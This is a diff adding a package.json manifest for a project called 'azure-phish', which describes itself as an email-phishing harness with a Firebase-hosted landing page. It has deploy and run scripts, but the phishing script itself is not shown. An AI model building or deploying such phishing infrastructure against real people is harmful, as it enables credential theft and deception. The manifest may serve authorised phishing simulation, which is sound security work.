@@ -1,0 +1,13 @@
+{
+  "name": "azure-phish",
+  "version": "1.0.0",
+  "description": "Minimal Azure Monitor email-phishing harness with a Firebase-hosted landing page.",
+  "private": true,
+  "scripts": {
+    "build:firebase": "node scripts/build-config.js && firebase deploy --only hosting",
+    "AzurePhish": "bash scripts/phish.sh --e"
+  },
+  "devDependencies": {
+    "dotenv": "^16.4.5"
+  }
+}
